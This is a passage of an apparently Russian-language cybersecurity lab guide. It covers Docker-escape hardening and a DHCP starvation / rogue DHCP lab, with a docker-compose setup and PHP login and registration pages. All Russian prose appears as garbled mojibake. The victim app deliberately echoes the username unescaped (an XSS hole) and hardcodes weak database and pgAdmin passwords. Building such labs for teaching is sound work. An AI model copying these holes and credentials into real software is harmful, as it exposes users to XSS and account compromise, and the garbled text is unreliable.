–ó–∞—â–∏—Ç–∞ –æ—Ç Docker Escape –≤ –∏–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä–µ –æ—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏–∏ —Å–æ —Å—Ç–æ—Ä–æ–Ω—ã –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞:
-	–∑–∞–ø—É—Å–∫ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–æ–≤ –±–µ–∑ –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π. –ò—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è —Ñ–ª–∞–≥–∏ --cap-drop –∏–ª–∏ --security-opt no-new-privileges –¥–ª—è —Å–Ω–∏–∂–µ–Ω–∏—è –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–æ–≤;
-	–∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ SELinux/AppArmor. –ü—Ä–∏–º–µ–Ω—è—é—Ç—Å—è –ø–æ–ª–∏—Ç–∏–∫–∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –¥–ª—è –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏—è –¥–µ–π—Å—Ç–≤–∏–π –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ –≤–Ω—É—Ç—Ä–∏ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–æ–≤;
-	–ø—Ä–æ–≤–µ—Ä–∫–∞ –∏ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ –æ–±—Ä–∞–∑–æ–≤. –í—Å–µ–≥–¥–∞ –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –ø—Ä–æ–≤–µ—Ä–µ–Ω–Ω—ã–µ –æ–±—Ä–∞–∑—ã, –º–∏–Ω–∏–º–∏–∑–∏—Ä—É–π—Ç–µ –Ω–∞–±–æ—Ä —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ã—Ö –ø–∞–∫–µ—Ç–æ–≤, —É–¥–∞–ª—è—é—Ç—Å—è —É—Ç–∏–ª–∏—Ç—ã, –∫–æ—Ç–æ—Ä—ã–µ –Ω–µ –Ω—É–∂–Ω—ã (–Ω–∞–ø—Ä–∏–º–µ—Ä, bash) –∏–∑ production-–æ–±—Ä–∞–∑–æ–≤;
-	–∏–∑–æ–ª—è—Ü–∏—è —Å–µ—Ç–∏ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–æ–≤. –ö–æ–Ω—Ç–µ–π–Ω–µ—Ä—ã –∏–∑ —Ä–∞–∑–Ω—ã—Ö –¥–æ–≤–µ—Ä–∏—Ç–µ–ª—å–Ω—ã—Ö –∑–æ–Ω —Ä–∞–∑–¥–µ–ª–µ–Ω—ã —Å–µ—Ç—å—é (–Ω–∞–ø—Ä–∏–º–µ—Ä, –ø–æ—Å—Ä–µ–¥—Å—Ç–≤–æ–º Docker Network).

## 3.5 üåê –ê—Ç–∞–∫–∞ –∏—Å—Ç–æ—â–µ–Ω–∏—è –ø—É–ª–∞ DHCP-–∞–¥—Ä–µ—Å–æ–≤ —Å –ø–æ–¥–º–µ–Ω–æ–π —Å–µ—Ä–≤–µ—Ä–∞ (DHCP Starvation & Rogue DHCP)

**DHCP Starvation** ‚Äî –º–∞—Å—Å–æ–≤–∞—è –≥–µ–Ω–µ—Ä–∞—Ü–∏—è DHCP DISCOVER/REQUEST —Å –ø–æ–¥—Å—Ç–∞–≤–Ω—ã–º–∏ MAC-–∞–¥—Ä–µ—Å–∞–º–∏ –¥–ª—è –±—ã—Å—Ç—Ä–æ–≥–æ –∏—Å—á–µ—Ä–ø–∞–Ω–∏—è –ø—É–ª–∞ –ª–µ–≥–∏—Ç–∏–º–Ω–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞.  
**Rogue DHCP** ‚Äî –∑–∞–ø—É—Å–∫ —Ñ–∞–ª—å—à–∏–≤–æ–≥–æ DHCP-—Å–µ—Ä–≤–µ—Ä–∞ –ø–æ—Å–ª–µ –∏—Å—Ç–æ—â–µ–Ω–∏—è –ø—É–ª–∞: –∫–ª–∏–µ–Ω—Ç—ã –ø–æ–ª—É—á–∞—é—Ç IP, —à–ª—é–∑ –∏ DNS, –∫–æ–Ω—Ç—Ä–æ–ª–∏—Ä—É–µ–º—ã–µ –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–æ–º, —á—Ç–æ —Å–æ–∑–¥–∞—ë—Ç —É—Å–ª–æ–≤–∏—è –¥–ª—è **MITM** –∏ –ø–æ–¥–º–µ–Ω—ã DNS. –û—Å–Ω–æ–≤–∞–Ω–æ –Ω–∞ –æ—Ç—Å—É—Ç—Å—Ç–≤–∏–∏ –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏ –≤ –ø—Ä–æ—Ç–æ–∫–æ–ª–µ **DHCP (CWE-346)**.

---

### üîπ –õ–∞–±–æ—Ä–∞—Ç–æ—Ä–Ω—ã–π —Å—Ç–µ–Ω–¥

**–¢–∞–±–ª–∏—Ü–∞ 4 ‚Äî –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è —Å—Ç–µ–Ω–¥–∞ –¥–ª—è DHCP Starvation / Rogue DHCP**

| IP-–∞–¥—Ä–µ—Å / –ü–æ—Ä—Ç     | –†–æ–ª—å                      | –û–ø–∏—Å–∞–Ω–∏–µ |
|---------------------|---------------------------|----------|
| `10.10.10.5:2222`   | –í–µ–±-—Å–µ—Ä–≤–µ—Ä                | –°–∞–π—Ç –æ—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏–∏: —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è, –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è |
| `10.10.10.5:1111`   | pgAdmin4                  | –í–µ–±-–∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–∏—è PostgreSQL |
| `10.10.10.5:5432`   | PostgreSQL                | –ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö —Å–∞–π—Ç–∞ |
| `10.10.10.1`        | –ú–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ç–æ—Ä *(MikroTik)*| –õ–µ–≥–∏—Ç–∏–º–Ω—ã–π DHCP (—á–∏—Å—Ç–∞—è —Å–µ—Ç—å) |
| `192.168.5.1`       | –ú–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ç–æ—Ä *(MikroTik)*| –õ–µ–≥–∏—Ç–∏–º–Ω—ã–π DHCP –≤–æ –≤—Ç–æ—Ä–æ–º —Å–µ–≥–º–µ–Ω—Ç–µ |
| `10.10.10.3`        | –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ *(Kali)*    | –ò—Å—Ç–æ—â–µ–Ω–∏–µ –ø—É–ª–∞ DHCP + –∑–∞–ø—É—Å–∫ Rogue DHCP, –∞–Ω–∞–ª–∏–∑ —Ç—Ä–∞—Ñ–∏–∫–∞ |
| `192.168.5.3`       | –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ *(Kali)*    | –¢–æ—Ç –∂–µ —Ö–æ—Å—Ç –≤ –ø–æ–¥—Å–µ—Ç–∏ 192.168.5.0/24 |
| `DHCP-Client`       | –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å *(Win10)*    | –ü–æ–ª—É—á–∞–µ—Ç –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –ª–∏–±–æ –æ—Ç MikroTik, –ª–∏–±–æ –æ—Ç Rogue DHCP |

> –í–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ (–Ω–∏–∂–µ) –Ω—É–∂–Ω–æ –∫–∞–∫ ¬´–∂–µ—Ä—Ç–≤–∞¬ª –¥–ª—è –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–∏ –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ —É—á—ë—Ç–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö/—Å–µ—Å—Å–∏–π –ø—Ä–∏ MITM.

---

## üì¶ C–µ—Ä–≤–µ—Ä–Ω–∞—è —á–∞—Å—Ç—å

```yaml
version: '3.8'

services:
  db:
    image: postgres:latest
    container_name: postgres_db
    environment:
      POSTGRES_USER: 163justIneffable
      POSTGRES_PASSWORD: P@ssw0rd
      POSTGRES_DB: anubis
    volumes:
      - db_data:/var/lib/postgresql/data
    ports:
      - "5432:5432"

  pgadmin:
    image: dpage/pgadmin4:latest
    container_name: pgadmin
    environment:
      PGADMIN_DEFAULT_EMAIL: *mail*
      PGADMIN_DEFAULT_PASSWORD: P@ssw0rd!
    ports:
      - "1111:80"
    depends_on:
      - db

  php:
    build:
      context: .
      dockerfile: Dockerfile
    volumes:
      - ./html:/var/www/html
    ports:
      - "2222:80"
    depends_on:
      - db

volumes:
  db_data:
```

### Dockerfile

```dockerfile
FROM php:apache

RUN apt-get update && \
    apt-get install -y libpq-dev && \
    docker-php-ext-install pgsql pdo_pgsql
```


---

## üóÇ –°—Ç—Ä—É–∫—Ç—É—Ä–∞ –ø—Ä–æ–µ–∫—Ç–∞

```
project-root/
‚îú‚îÄ docker-compose.yml
‚îú‚îÄ Dockerfile
‚îî‚îÄ html/
   ‚îú‚îÄ index.html
   ‚îú‚îÄ register.php
   ‚îú‚îÄ login.php
   ‚îî‚îÄ style.css
```

–°–æ–∑–¥–∞—ë–º –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é –ø–æ–¥ –∫–æ–¥:

```bash
mkdir -p html
```

### üóÇ –§–∞–π–ª—ã –ø—Ä–æ–µ–∫—Ç–∞ (–≤–µ–±)

**index.html**
```html
<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>–°–∞–π—Ç —Å —É—è–∑–≤–∏–º–æ—Å—Ç—å—é –∫ SQL –∏–Ω—ä–µ–∫—Ü–∏–∏</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="container">
    <h1>–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å!</h1>
    <div class="form-options">
      <a href="login.php" class="button">–ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è</a>
      <a href="register.php" class="button">–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è</a>
    </div>
  </div>
</body>
</html>
```

**login.php**
```php
<?php
// –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ –±–∞–∑–µ –¥–∞–Ω–Ω—ã—Ö —á–µ—Ä–µ–∑ PDO
$conn = new PDO("pgsql:host=192.168.0.20;dbname=anubis", "163justIneffable", "P@ssw0rd");

// –ü—Ä–æ–≤–µ—Ä–∫–∞, —á—Ç–æ —Ñ–æ—Ä–º–∞ –±—ã–ª–∞ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ –º–µ—Ç–æ–¥–æ–º POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // –ü–æ–ª—É—á–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö –∏–∑ —Ñ–æ—Ä–º—ã
    $username = $_POST['username'];
    $password = $_POST['password'];

    // –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –ø–æ–¥–≥–æ—Ç–æ–≤–ª–µ–Ω–Ω–æ–≥–æ –∑–∞–ø—Ä–æ—Å–∞
    $stmt = $conn->prepare("SELECT password FROM users WHERE username = :username");
    $stmt->bindParam(':username', $username);
    $stmt->execute();

    // –ü–æ–ª—É—á–µ–Ω–∏–µ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞
    $user = $stmt->fetch(PDO::FETCH_ASSOC);

    if ($user && password_verify($password, $user['password'])) {
        // ‚ö†Ô∏è –î–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–æ–Ω–Ω–æ: –≤—ã–≤–æ–¥ –±–µ–∑ —ç–∫—Ä–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è (–ø–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω—ã–π XSS –ø—Ä–∏ –∑–ª–æ–Ω–∞–º–µ—Ä–µ–Ω–Ω–æ–º username)
        echo "–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å, " . $username . "!";
    } else {
        echo "–ù–µ–≤–µ—Ä–Ω–æ–µ –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–ª–∏ –ø–∞—Ä–æ–ª—å.";
    }
}
?>
<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>–ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="container">
    <h1>–ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è</h1>
    <form method="POST" action="login.php">
      <label for="username">–ò–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:</label>
      <input type="text" id="username" name="username" required><br><br>
      <label for="password">–ü–∞—Ä–æ–ª—å:</label>
      <input type="password" id="password" name="password" required><br><br>
      <button type="submit">–í–æ–π—Ç–∏</button>
    </form>
    <a href="register.php" class="button">–ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è</a>
    <a href="index.html">–ù–∞–∑–∞–¥</a>
  </div>
</body>
</html>
```

**register.php**
```php
<?php
// –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ –±–∞–∑–µ –¥–∞–Ω–Ω—ã—Ö
$conn = new PDO("pgsql:host=192.168.0.20;dbname=anubis", "163justIneffable", "P@ssw0rd");

// –û–±—Ä–∞–±–æ—Ç–∫–∞ –¥–∞–Ω–Ω—ã—Ö —Ñ–æ—Ä–º—ã
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $password = password_hash($_POST['password'], PASSWORD_DEFAULT); // –•–µ—à–∏—Ä–æ–≤–∞–Ω–∏–µ –ø–∞—Ä–æ–ª—è

    // –ó–∞–ø—Ä–æ—Å –Ω–∞ –¥–æ–±–∞–≤–ª–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    $stmt = $conn->prepare("INSERT INTO users (username, password) VALUES (:username, :password)");
    $stmt->bindParam(':username', $username);
    $stmt->bindParam(':password', $password);

    if ($stmt->execute()) {
        echo "–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è –ø—Ä–æ—à–ª–∞ —É—Å–ø–µ—à–Ω–æ!";
    } else {
        echo "–û—à–∏–±–∫–∞ –ø—Ä–∏ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏.";
    }
}
?>
<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="container">
    <h1>–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è</h1>
    <form method="POST" action="register.php">
      <label for="username">–ò–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:</label>
      <input type="text" id="username" name="username" required><br><br>
      <label for="password">–ü–∞—Ä–æ–ª—å:</label>
      <input type="password" id="password" name="password" required><br><br>
      <button type="submit">–ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è</button>
    </form>
    <a href="index.html">–ù–∞–∑–∞–¥</a>
  </div>
</body>
</html>
```

**style.css**
```css
body {
    font-family: Arial, sans-serif;
    margin: 0;
    padding: 0;
    background-color: #f4f4f9;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    box-sizing: border-box;
}

.container {
    background-color: #fff;
    padding: 40px;
    border-radius: 10px;
    box-shadow: 0 6px 12px rgba(0, 0, 0, 0.1);
    width: 320px;
    text-align: center;
}

h1 {
    margin-bottom: 25px;
    font-size: 24px;
    color: #333;
}

form {
    display: flex;
    flex-direction: column;
    gap: 20px;
}

input {
    padding: 12px;
    border: 1px solid #ccc;
    border-radius: 5px;
    font-size: 16px;
    width: 100%;
    box-sizing: border-box;
}

button {
    padding: 12px;
    border: none;
    background-color: #28a745;
    color: white;
    border-radius: 5px;
    cursor: pointer;
    font-size: 16px;
}

button:hover {
    background-color: #218838;
}

a {
    color: #007bff;
    text-decoration: none;
    margin-top: 15px;
    display: inline-block;
}

a:hover {
    text-decoration: underline;
}

.form-options {
    display: flex;
    justify-content: center;
    gap: 20px;
    margin-top: 20px;
}

.form-options a {
    padding: 10px 20px;
    background-color: #007bff;
    color: white;
    border-radius: 5px;
    text-decoration: none;
}

.form-options a:hover {
    background-color: #0056b3;
}
```

![–¢–æ–ø–æ–ª–æ–≥–∏—è](./images/topology.png)


### –≤ –±–ª–∏–∂–∞–π—à–µ–µ –≤—Ä–µ–º—è –Ω–∞—á–Ω—É –¥–æ–ø–∏—Å—ã–≤–∞—Ç—å –µ—â–µ –æ—Å—Ç–∞–≤—à–∏–µ—Å—è –∞—Ç–∞–∫–∏...
